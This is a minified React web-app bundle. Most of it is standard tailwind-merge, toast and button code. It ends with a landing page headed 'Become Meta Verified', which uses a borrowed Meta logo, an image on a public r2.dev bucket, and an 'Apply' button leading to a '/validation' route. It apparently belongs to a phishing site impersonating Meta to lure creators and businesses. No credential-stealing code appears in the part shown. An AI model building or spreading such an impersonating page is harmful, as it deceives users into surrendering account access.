  , Qb = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/
  , qb = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/
  , Gb = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/
  , Yb = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/
  , jn = e => Wo(e) || Zb.has(e) || Wb.test(e)
  , er = e => _s(e, "length", sC)
  , Wo = e => !!e && !Number.isNaN(Number(e))
  , sc = e => _s(e, "number", Wo)
  , Ls = e => !!e && Number.isInteger(Number(e))
  , Xb = e => e.endsWith("%") && Wo(e.slice(0, -1))
  , le = e => Yy.test(e)
  , tr = e => Kb.test(e)
  , Jb = new Set(["length", "size", "percentage"])
  , eC = e => _s(e, Jb, Xy)
  , tC = e => _s(e, "position", Xy)
  , nC = new Set(["image", "url"])
  , rC = e => _s(e, nC, aC)
  , oC = e => _s(e, "", iC)
  , Ds = () => !0
  , _s = (e, t, n) => {
    const r = Yy.exec(e);
    return r ? r[1] ? typeof t == "string" ? r[1] === t : t.has(r[1]) : n(r[2]) : !1
}
  , sC = e => Qb.test(e) && !qb.test(e)
  , Xy = () => !1
  , iC = e => Gb.test(e)
  , aC = e => Yb.test(e)
  , lC = () => {
    const e = ke("colors")
      , t = ke("spacing")
      , n = ke("blur")
      , r = ke("brightness")
      , o = ke("borderColor")
      , s = ke("borderRadius")
      , i = ke("borderSpacing")
      , a = ke("borderWidth")
      , l = ke("contrast")
      , u = ke("grayscale")
      , c = ke("hueRotate")
      , d = ke("invert")
      , p = ke("gap")
      , w = ke("gradientColorStops")
      , x = ke("gradientColorStopPositions")
      , m = ke("inset")
      , S = ke("margin")
      , v = ke("opacity")
      , f = ke("padding")
      , y = ke("saturate")
      , _ = ke("scale")
      , b = ke("sepia")
      , T = ke("skew")
      , k = ke("space")
      , P = ke("translate")
      , z = () => ["auto", "contain", "none"]
      , L = () => ["auto", "hidden", "clip", "visible", "scroll"]
      , X = () => ["auto", le, t]
      , O = () => [le, t]
      , U = () => ["", jn, er]
      , j = () => ["auto", Wo, le]
      , q = () => ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top"]
      , K = () => ["solid", "dashed", "dotted", "double", "none"]
      , Y = () => ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"]
      , N = () => ["start", "end", "center", "between", "around", "evenly", "stretch"]
      , F = () => ["", "0", le]
      , Q = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
      , re = () => [Wo, le];
    return {
        cacheSize: 500,
        separator: ":",
        theme: {
            colors: [Ds],
            spacing: [jn, er],
            blur: ["none", "", tr, le],
            brightness: re(),
            borderColor: [e],
            borderRadius: ["none", "", "full", tr, le],
            borderSpacing: O(),
            borderWidth: U(),
            contrast: re(),
            grayscale: F(),
            hueRotate: re(),
            invert: F(),
            gap: O(),
            gradientColorStops: [e],
            gradientColorStopPositions: [Xb, er],
            inset: X(),
            margin: X(),
            opacity: re(),
            padding: O(),
            saturate: re(),
            scale: re(),
            sepia: F(),
            skew: re(),
            space: O(),
            translate: O()
        },
        classGroups: {
            aspect: [{
                aspect: ["auto", "square", "video", le]
            }],
            container: ["container"],
            columns: [{
                columns: [tr]
            }],
            "break-after": [{
                "break-after": Q()
            }],
            "break-before": [{
                "break-before": Q()
            }],
            "break-inside": [{
                "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
            }],
            "box-decoration": [{
                "box-decoration": ["slice", "clone"]
            }],
            box: [{
                box: ["border", "content"]
            }],
            display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
            float: [{
                float: ["right", "left", "none", "start", "end"]
            }],
            clear: [{
                clear: ["left", "right", "both", "none", "start", "end"]
            }],
            isolation: ["isolate", "isolation-auto"],
            "object-fit": [{
                object: ["contain", "cover", "fill", "none", "scale-down"]
            }],
            "object-position": [{
                object: [...q(), le]
            }],
            overflow: [{
                overflow: L()
            }],
            "overflow-x": [{
                "overflow-x": L()
            }],
            "overflow-y": [{
                "overflow-y": L()
            }],
            overscroll: [{
                overscroll: z()
            }],
            "overscroll-x": [{
                "overscroll-x": z()
            }],
            "overscroll-y": [{
                "overscroll-y": z()
            }],
            position: ["static", "fixed", "absolute", "relative", "sticky"],
            inset: [{
                inset: [m]
            }],
            "inset-x": [{
                "inset-x": [m]
            }],
            "inset-y": [{
                "inset-y": [m]
            }],
            start: [{
                start: [m]
            }],
            end: [{
                end: [m]
            }],
            top: [{
                top: [m]
            }],
            right: [{
                right: [m]
            }],
            bottom: [{
                bottom: [m]
            }],
            left: [{
                left: [m]
            }],
            visibility: ["visible", "invisible", "collapse"],
            z: [{
                z: ["auto", Ls, le]
            }],
            basis: [{
                basis: X()
            }],
            "flex-direction": [{
                flex: ["row", "row-reverse", "col", "col-reverse"]
            }],
            "flex-wrap": [{
                flex: ["wrap", "wrap-reverse", "nowrap"]
            }],
            flex: [{
                flex: ["1", "auto", "initial", "none", le]
            }],
            grow: [{
                grow: F()
            }],
            shrink: [{
                shrink: F()
            }],
            order: [{
                order: ["first", "last", "none", Ls, le]
            }],
            "grid-cols": [{
                "grid-cols": [Ds]
            }],
            "col-start-end": [{
                col: ["auto", {
                    span: ["full", Ls, le]
                }, le]
            }],
            "col-start": [{
                "col-start": j()
            }],
            "col-end": [{
                "col-end": j()
            }],
            "grid-rows": [{
                "grid-rows": [Ds]
            }],
            "row-start-end": [{
                row: ["auto", {
                    span: [Ls, le]
                }, le]
            }],
            "row-start": [{
                "row-start": j()
            }],
            "row-end": [{
                "row-end": j()
            }],
            "grid-flow": [{
                "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
            }],
            "auto-cols": [{
                "auto-cols": ["auto", "min", "max", "fr", le]
            }],
            "auto-rows": [{
                "auto-rows": ["auto", "min", "max", "fr", le]
            }],
            gap: [{
                gap: [p]
            }],
            "gap-x": [{
                "gap-x": [p]
            }],
            "gap-y": [{
                "gap-y": [p]
            }],
            "justify-content": [{
                justify: ["normal", ...N()]
            }],
            "justify-items": [{
                "justify-items": ["start", "end", "center", "stretch"]
            }],
            "justify-self": [{
                "justify-self": ["auto", "start", "end", "center", "stretch"]
            }],
            "align-content": [{
                content: ["normal", ...N(), "baseline"]
            }],
            "align-items": [{
                items: ["start", "end", "center", "baseline", "stretch"]
            }],
            "align-self": [{
                self: ["auto", "start", "end", "center", "stretch", "baseline"]
            }],
            "place-content": [{
                "place-content": [...N(), "baseline"]
            }],
            "place-items": [{
                "place-items": ["start", "end", "center", "baseline", "stretch"]
            }],
            "place-self": [{
                "place-self": ["auto", "start", "end", "center", "stretch"]
            }],
            p: [{
                p: [f]
            }],
            px: [{
                px: [f]
            }],
            py: [{
                py: [f]
            }],
            ps: [{
                ps: [f]
            }],
            pe: [{
                pe: [f]
            }],
            pt: [{
                pt: [f]
            }],
            pr: [{
                pr: [f]
            }],
            pb: [{
                pb: [f]
            }],
            pl: [{
                pl: [f]
            }],
            m: [{
                m: [S]
            }],
            mx: [{
                mx: [S]
            }],
            my: [{
                my: [S]
            }],
            ms: [{
                ms: [S]
            }],
            me: [{
                me: [S]
            }],
            mt: [{
                mt: [S]
            }],
            mr: [{
                mr: [S]
            }],
            mb: [{
                mb: [S]
            }],
            ml: [{
                ml: [S]
            }],
            "space-x": [{
                "space-x": [k]
            }],
            "space-x-reverse": ["space-x-reverse"],
            "space-y": [{
                "space-y": [k]
            }],
            "space-y-reverse": ["space-y-reverse"],
            w: [{
                w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", le, t]
            }],
            "min-w": [{
                "min-w": [le, t, "min", "max", "fit"]
            }],
            "max-w": [{
                "max-w": [le, t, "none", "full", "min", "max", "fit", "prose", {
                    screen: [tr]
                }, tr]
            }],
            h: [{
                h: [le, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            "min-h": [{
                "min-h": [le, t, "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            "max-h": [{
                "max-h": [le, t, "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            size: [{
                size: [le, t, "auto", "min", "max", "fit"]
            }],
            "font-size": [{
                text: ["base", tr, er]
            }],
            "font-smoothing": ["antialiased", "subpixel-antialiased"],
            "font-style": ["italic", "not-italic"],
            "font-weight": [{
                font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", sc]
            }],
            "font-family": [{
                font: [Ds]
            }],
            "fvn-normal": ["normal-nums"],
            "fvn-ordinal": ["ordinal"],
            "fvn-slashed-zero": ["slashed-zero"],
            "fvn-figure": ["lining-nums", "oldstyle-nums"],
            "fvn-spacing": ["proportional-nums", "tabular-nums"],
            "fvn-fraction": ["diagonal-fractions", "stacked-fractions"],
            tracking: [{
                tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", le]
            }],
            "line-clamp": [{
                "line-clamp": ["none", Wo, sc]
            }],
            leading: [{
                leading: ["none", "tight", "snug", "normal", "relaxed", "loose", jn, le]
            }],
            "list-image": [{
                "list-image": ["none", le]
            }],
            "list-style-type": [{
                list: ["none", "disc", "decimal", le]
            }],
            "list-style-position": [{
                list: ["inside", "outside"]
            }],
            "placeholder-color": [{
                placeholder: [e]
            }],
            "placeholder-opacity": [{
                "placeholder-opacity": [v]
            }],
            "text-alignment": [{
                text: ["left", "center", "right", "justify", "start", "end"]
            }],
            "text-color": [{
                text: [e]
            }],
            "text-opacity": [{
                "text-opacity": [v]
            }],
            "text-decoration": ["underline", "overline", "line-through", "no-underline"],
            "text-decoration-style": [{
                decoration: [...K(), "wavy"]
            }],
            "text-decoration-thickness": [{
                decoration: ["auto", "from-font", jn, er]
            }],
            "underline-offset": [{
                "underline-offset": ["auto", jn, le]
            }],
            "text-decoration-color": [{
                decoration: [e]
            }],
            "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
            "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
            "text-wrap": [{
                text: ["wrap", "nowrap", "balance", "pretty"]
            }],
            indent: [{
                indent: O()
            }],
            "vertical-align": [{
                align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", le]
            }],
            whitespace: [{
                whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
            }],
            break: [{
                break: ["normal", "words", "all", "keep"]
            }],
            hyphens: [{
                hyphens: ["none", "manual", "auto"]
            }],
            content: [{
                content: ["none", le]
            }],
            "bg-attachment": [{
                bg: ["fixed", "local", "scroll"]
            }],
            "bg-clip": [{
                "bg-clip": ["border", "padding", "content", "text"]
            }],
            "bg-opacity": [{
                "bg-opacity": [v]
            }],
            "bg-origin": [{
                "bg-origin": ["border", "padding", "content"]
            }],
            "bg-position": [{
                bg: [...q(), tC]
            }],
            "bg-repeat": [{
                bg: ["no-repeat", {
                    repeat: ["", "x", "y", "round", "space"]
                }]
            }],
            "bg-size": [{
                bg: ["auto", "cover", "contain", eC]
            }],
            "bg-image": [{
                bg: ["none", {
                    "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
                }, rC]
            }],
            "bg-color": [{
                bg: [e]
            }],
            "gradient-from-pos": [{
                from: [x]
            }],
            "gradient-via-pos": [{
                via: [x]
            }],
            "gradient-to-pos": [{
                to: [x]
            }],
            "gradient-from": [{
                from: [w]
            }],
            "gradient-via": [{
                via: [w]
            }],
            "gradient-to": [{
                to: [w]
            }],
            rounded: [{
                rounded: [s]
            }],
            "rounded-s": [{
                "rounded-s": [s]
            }],
            "rounded-e": [{
                "rounded-e": [s]
            }],
            "rounded-t": [{
                "rounded-t": [s]
            }],
            "rounded-r": [{
                "rounded-r": [s]
            }],
            "rounded-b": [{
                "rounded-b": [s]
            }],
            "rounded-l": [{
                "rounded-l": [s]
            }],
            "rounded-ss": [{
                "rounded-ss": [s]
            }],
            "rounded-se": [{
                "rounded-se": [s]
            }],
            "rounded-ee": [{
                "rounded-ee": [s]
            }],
            "rounded-es": [{
                "rounded-es": [s]
            }],
            "rounded-tl": [{
                "rounded-tl": [s]
            }],
            "rounded-tr": [{
                "rounded-tr": [s]
            }],
            "rounded-br": [{
                "rounded-br": [s]
            }],
            "rounded-bl": [{
                "rounded-bl": [s]
            }],
            "border-w": [{
                border: [a]
            }],
            "border-w-x": [{
                "border-x": [a]
            }],
            "border-w-y": [{
                "border-y": [a]
            }],
            "border-w-s": [{
                "border-s": [a]
            }],
            "border-w-e": [{
                "border-e": [a]
            }],
            "border-w-t": [{
                "border-t": [a]
            }],
            "border-w-r": [{
                "border-r": [a]
            }],
            "border-w-b": [{
                "border-b": [a]
            }],
            "border-w-l": [{
                "border-l": [a]
            }],
            "border-opacity": [{
                "border-opacity": [v]
            }],
            "border-style": [{
                border: [...K(), "hidden"]
            }],
            "divide-x": [{
                "divide-x": [a]
            }],
            "divide-x-reverse": ["divide-x-reverse"],
            "divide-y": [{
                "divide-y": [a]
            }],
            "divide-y-reverse": ["divide-y-reverse"],
            "divide-opacity": [{
                "divide-opacity": [v]
            }],
            "divide-style": [{
                divide: K()
            }],
            "border-color": [{
                border: [o]
            }],
            "border-color-x": [{
                "border-x": [o]
            }],
            "border-color-y": [{
                "border-y": [o]
            }],
            "border-color-s": [{
                "border-s": [o]
            }],
            "border-color-e": [{
                "border-e": [o]
            }],
            "border-color-t": [{
                "border-t": [o]
            }],
            "border-color-r": [{
                "border-r": [o]
            }],
            "border-color-b": [{
                "border-b": [o]
            }],
            "border-color-l": [{
                "border-l": [o]
            }],
            "divide-color": [{
                divide: [o]
            }],
            "outline-style": [{
                outline: ["", ...K()]
            }],
            "outline-offset": [{
                "outline-offset": [jn, le]
            }],
            "outline-w": [{
                outline: [jn, er]
            }],
            "outline-color": [{
                outline: [e]
            }],
            "ring-w": [{
                ring: U()
            }],
            "ring-w-inset": ["ring-inset"],
            "ring-color": [{
                ring: [e]
            }],
            "ring-opacity": [{
                "ring-opacity": [v]
            }],
            "ring-offset-w": [{
                "ring-offset": [jn, er]
            }],
            "ring-offset-color": [{
                "ring-offset": [e]
            }],
            shadow: [{
                shadow: ["", "inner", "none", tr, oC]
            }],
            "shadow-color": [{
                shadow: [Ds]
            }],
            opacity: [{
                opacity: [v]
            }],
            "mix-blend": [{
                "mix-blend": [...Y(), "plus-lighter", "plus-darker"]
            }],
            "bg-blend": [{
                "bg-blend": Y()
            }],
            filter: [{
                filter: ["", "none"]
            }],
            blur: [{
                blur: [n]
            }],
            brightness: [{
                brightness: [r]
            }],
            contrast: [{
                contrast: [l]
            }],
            "drop-shadow": [{
                "drop-shadow": ["", "none", tr, le]
            }],
            grayscale: [{
                grayscale: [u]
            }],
            "hue-rotate": [{
                "hue-rotate": [c]
            }],
            invert: [{
                invert: [d]
            }],
            saturate: [{
                saturate: [y]
            }],
            sepia: [{
                sepia: [b]
            }],
            "backdrop-filter": [{
                "backdrop-filter": ["", "none"]
            }],
            "backdrop-blur": [{
                "backdrop-blur": [n]
            }],
            "backdrop-brightness": [{
                "backdrop-brightness": [r]
            }],
            "backdrop-contrast": [{
                "backdrop-contrast": [l]
            }],
            "backdrop-grayscale": [{
                "backdrop-grayscale": [u]
            }],
            "backdrop-hue-rotate": [{
                "backdrop-hue-rotate": [c]
            }],
            "backdrop-invert": [{
                "backdrop-invert": [d]
            }],
            "backdrop-opacity": [{
                "backdrop-opacity": [v]
            }],
            "backdrop-saturate": [{
                "backdrop-saturate": [y]
            }],
            "backdrop-sepia": [{
                "backdrop-sepia": [b]
            }],
            "border-collapse": [{
                border: ["collapse", "separate"]
            }],
            "border-spacing": [{
                "border-spacing": [i]
            }],
            "border-spacing-x": [{
                "border-spacing-x": [i]
            }],
            "border-spacing-y": [{
                "border-spacing-y": [i]
            }],
            "table-layout": [{
                table: ["auto", "fixed"]
            }],
            caption: [{
                caption: ["top", "bottom"]
            }],
            transition: [{
                transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", le]
            }],
            duration: [{
                duration: re()
            }],
            ease: [{
                ease: ["linear", "in", "out", "in-out", le]
            }],
            delay: [{
                delay: re()
            }],
            animate: [{
                animate: ["none", "spin", "ping", "pulse", "bounce", le]
            }],
            transform: [{
                transform: ["", "gpu", "none"]
            }],
            scale: [{
                scale: [_]
            }],
            "scale-x": [{
                "scale-x": [_]
            }],
            "scale-y": [{
                "scale-y": [_]
            }],
            rotate: [{
                rotate: [Ls, le]
            }],
            "translate-x": [{
                "translate-x": [P]
            }],
            "translate-y": [{
                "translate-y": [P]
            }],
            "skew-x": [{
                "skew-x": [T]
            }],
            "skew-y": [{
                "skew-y": [T]
            }],
            "transform-origin": [{
                origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", le]
            }],
            accent: [{
                accent: ["auto", e]
            }],
            appearance: [{
                appearance: ["none", "auto"]
            }],
            cursor: [{
                cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", le]
            }],
            "caret-color": [{
                caret: [e]
            }],
            "pointer-events": [{
                "pointer-events": ["none", "auto"]
            }],
            resize: [{
                resize: ["none", "y", "x", ""]
            }],
            "scroll-behavior": [{
                scroll: ["auto", "smooth"]
            }],
            "scroll-m": [{
                "scroll-m": O()
            }],
            "scroll-mx": [{
                "scroll-mx": O()
            }],
            "scroll-my": [{
                "scroll-my": O()
            }],
            "scroll-ms": [{
                "scroll-ms": O()
            }],
            "scroll-me": [{
                "scroll-me": O()
            }],
            "scroll-mt": [{
                "scroll-mt": O()
            }],
            "scroll-mr": [{
                "scroll-mr": O()
            }],
            "scroll-mb": [{
                "scroll-mb": O()
            }],
            "scroll-ml": [{
                "scroll-ml": O()
            }],
            "scroll-p": [{
                "scroll-p": O()
            }],
            "scroll-px": [{
                "scroll-px": O()
            }],
            "scroll-py": [{
                "scroll-py": O()
            }],
            "scroll-ps": [{
                "scroll-ps": O()
            }],
            "scroll-pe": [{
                "scroll-pe": O()
            }],
            "scroll-pt": [{
                "scroll-pt": O()
            }],
            "scroll-pr": [{
                "scroll-pr": O()
            }],
            "scroll-pb": [{
                "scroll-pb": O()
            }],
            "scroll-pl": [{
                "scroll-pl": O()
            }],
            "snap-align": [{
                snap: ["start", "end", "center", "align-none"]
            }],
            "snap-stop": [{
                snap: ["normal", "always"]
            }],
            "snap-type": [{
                snap: ["none", "x", "y", "both"]
            }],
            "snap-strictness": [{
                snap: ["mandatory", "proximity"]
            }],
            touch: [{
                touch: ["auto", "none", "manipulation"]
            }],
            "touch-x": [{
                "touch-pan": ["x", "left", "right"]
            }],
            "touch-y": [{
                "touch-pan": ["y", "up", "down"]
            }],
            "touch-pz": ["touch-pinch-zoom"],
            select: [{
                select: ["none", "text", "all", "auto"]
            }],
            "will-change": [{
                "will-change": ["auto", "scroll", "contents", "transform", le]
            }],
            fill: [{
                fill: [e, "none"]
            }],
            "stroke-w": [{
                stroke: [jn, er, sc]
            }],
            stroke: [{
                stroke: [e, "none"]
            }],
            sr: ["sr-only", "not-sr-only"],
            "forced-color-adjust": [{
                "forced-color-adjust": ["auto", "none"]
            }]
        },
        conflictingClassGroups: {
            overflow: ["overflow-x", "overflow-y"],
            overscroll: ["overscroll-x", "overscroll-y"],
            inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
            "inset-x": ["right", "left"],
            "inset-y": ["top", "bottom"],
            flex: ["basis", "grow", "shrink"],
            gap: ["gap-x", "gap-y"],
            p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
            px: ["pr", "pl"],
            py: ["pt", "pb"],
            m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
            mx: ["mr", "ml"],
            my: ["mt", "mb"],
            size: ["w", "h"],
            "font-size": ["leading"],
            "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
            "fvn-ordinal": ["fvn-normal"],
            "fvn-slashed-zero": ["fvn-normal"],
            "fvn-figure": ["fvn-normal"],
            "fvn-spacing": ["fvn-normal"],
            "fvn-fraction": ["fvn-normal"],
            "line-clamp": ["display", "overflow"],
            rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
            "rounded-s": ["rounded-ss", "rounded-es"],
            "rounded-e": ["rounded-se", "rounded-ee"],
            "rounded-t": ["rounded-tl", "rounded-tr"],
            "rounded-r": ["rounded-tr", "rounded-br"],
            "rounded-b": ["rounded-br", "rounded-bl"],
            "rounded-l": ["rounded-tl", "rounded-bl"],
            "border-spacing": ["border-spacing-x", "border-spacing-y"],
            "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
            "border-w-x": ["border-w-r", "border-w-l"],
            "border-w-y": ["border-w-t", "border-w-b"],
            "border-color": ["border-color-s", "border-color-e", "border-color-t", "border-color-r", "border-color-b", "border-color-l"],
            "border-color-x": ["border-color-r", "border-color-l"],
            "border-color-y": ["border-color-t", "border-color-b"],
            "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
            "scroll-mx": ["scroll-mr", "scroll-ml"],
            "scroll-my": ["scroll-mt", "scroll-mb"],
            "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
            "scroll-px": ["scroll-pr", "scroll-pl"],
            "scroll-py": ["scroll-pt", "scroll-pb"],
            touch: ["touch-x", "touch-y", "touch-pz"],
            "touch-x": ["touch"],
            "touch-y": ["touch"],
            "touch-pz": ["touch"]
        },
        conflictingClassGroupModifiers: {
            "font-size": ["leading"]
        }
    }
}
  , uC = Hb(lC);
function ve(...e) {
    return uC(Hy(e))
}
const cC = gb
  , Jy = h.forwardRef( ({className: e, ...t}, n) => g.jsx(Dy, {
    ref: n,
    className: ve("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]", e),
    ...t
}));
Jy.displayName = Dy.displayName;
const dC = Uf("group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full", {
    variants: {
        variant: {
            default: "border bg-background text-foreground",
            destructive: "destructive group border-destructive bg-destructive text-destructive-foreground"
        }
    },
    defaultVariants: {
        variant: "default"
    }
})
  , ew = h.forwardRef( ({className: e, variant: t, ...n}, r) => g.jsx(Fy, {
    ref: r,
    className: ve(dC({
        variant: t
    }), e),
    ...n
}));
ew.displayName = Fy.displayName;
const fC = h.forwardRef( ({className: e, ...t}, n) => g.jsx($y, {
    ref: n,
    className: ve("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-muted/40 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive", e),
    ...t
}));
fC.displayName = $y.displayName;
const tw = h.forwardRef( ({className: e, ...t}, n) => g.jsx(Uy, {
    ref: n,
    className: ve("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600", e),
    "toast-close": "",
    ...t,
    children: g.jsx(Ky, {
        className: "h-4 w-4"
    })
}));
tw.displayName = Uy.displayName;
const nw = h.forwardRef( ({className: e, ...t}, n) => g.jsx(Vy, {
    ref: n,
    className: ve("text-sm font-semibold", e),
    ...t
}));
nw.displayName = Vy.displayName;
const rw = h.forwardRef( ({className: e, ...t}, n) => g.jsx(zy, {
    ref: n,
    className: ve("text-sm opacity-90", e),
    ...t
}));
rw.displayName = zy.displayName;
function pC() {
    const {toasts: e} = Df();
    return g.jsxs(cC, {
        children: [e.map(function({id: t, title: n, description: r, action: o, ...s}) {
            return g.jsxs(ew, {
                ...s,
                children: [g.jsxs("div", {
                    className: "grid gap-1",
                    children: [n && g.jsx(nw, {
                        children: n
                    }), r && g.jsx(rw, {
                        children: r
                    })]
                }), o, g.jsx(tw, {})]
            }, t)
        }), g.jsx(Jy, {})]
    })
}
const hC = Uf("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", {
    variants: {
        variant: {
            default: "bg-primary text-primary-foreground hover:bg-primary/90",
            destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
            outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
            secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
            ghost: "hover:bg-accent hover:text-accent-foreground",
            link: "text-primary underline-offset-4 hover:underline"
        },
        size: {
            default: "h-10 px-4 py-2",
            sm: "h-9 rounded-md px-3",
            lg: "h-11 rounded-md px-8",
            icon: "h-10 w-10"
        }
    },
    defaultVariants: {
        variant: "default",
        size: "default"
    }
})
  , Es = h.forwardRef( ({className: e, variant: t, size: n, asChild: r=!1, ...o}, s) => {
    const i = r ? Tr : "button";
    return g.jsx(i, {
        className: ve(hC({
            variant: t,
            size: n,
            className: e
        })),
        ref: s,
        ...o
    })
}
);
Es.displayName = "Button";
function ow() {
    const [e,t] = h.useState(!1);
    return h.useEffect( () => {
        const n = () => {
            t(window.innerWidth < 768)
        }
        ;
        return n(),
        window.addEventListener("resize", n),
        () => {
            window.removeEventListener("resize", n)
        }
    }
    , []),
    e
}
function mC() {
    const e = ow();
    return g.jsxs("div", {
        className: "flex flex-col md:flex-row min-h-screen",
        children: [g.jsx("div", {
            className: "w-full md:w-[42%] h-[27vh] md:h-screen shrink-0",
            style: {
                backgroundImage: 'url("https://pub-804f6dcb45594c119ba6e0d63e10c013.r2.dev/bg-img.jpg")',
                backgroundSize: "cover",
                backgroundPosition: "center",
                backgroundRepeat: "no-repeat"
            }
        }), g.jsxs("div", {
            className: "flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 bg-white",
            children: [g.jsx("img", {
                src: "https://cdn-icons-png.flaticon.com/512/5968/5968764.png",
                alt: "Meta Logo",
                className: `${e ? "w-12 h-12" : "w-16 h-16"} mb-3 sm:mb-4`
            }), g.jsxs("h1", {
                className: "text-2xl sm:text-3xl md:text-4xl font-bold text-center text-[#212529] mb-3 sm:mb-4",
                children: ["Become ", g.jsx("br", {}), "Meta Verified"]
            }), g.jsx(q_, {
                href: "/validation",
                children: g.jsxs(Es, {
                    size: e ? "default" : "lg",
                    className: "px-6 sm:px-7 md:px-8 py-2 sm:py-2.5 rounded-md bg-[#1877f2] hover:bg-[#166fe5] text-sm sm:text-base transition-colors duration-200",
                    children: ["Apply", g.jsx(Sb, {
                        className: "ml-2 h-3 w-3 sm:h-4 sm:w-4"
                    })]
                })
            }), g.jsxs("p", {
                className: "mt-4 sm:mt-5 md:mt-6 text-sm sm:text-base md:text-lg text-center text-[#65676B] px-2 sm:px-4",
                children: ["Grow your social presence with Meta Verified – a new subscription", !e && g.jsx("br", {}), " bundle available for creators and businesses on Instagram and ", !e && g.jsx("br", {}), "Facebook."]
            }), g.jsx("p", {
                className: "mt-3 sm:mt-4 text-[13px] sm:text-[15px] md:text-[17px] text-[#1877f2]",
                children: "Sign up now for creators"
            }), g.jsxs("div", {
                className: "mt-3 sm:mt-4 text-center px-4 text-[#65676B]",
                children: [g.jsx("span", {
                    className: "font-semibold",
                    children: "Are you a business?"
                }), " Get more information on"]
            }), g.jsx("a", {
                href: "#",
                className: "mt-2 text-xs sm:text-sm text-[#1877f2] hover:underline",
                children: "Meta support for businesses"
            }), g.jsx("p", {
                className: "mt-3 sm:mt-4 text-xs sm:text-sm italic text-[#65676B] px-4 text-center",
                children: "Features, availability, and pricing may vary by region."
            })]
        })]
    })
}
var ra = e => e.type === "checkbox"
  , Zr = e => e instanceof Date
  , vt = e => e == null;
const sw = e => typeof e == "object";
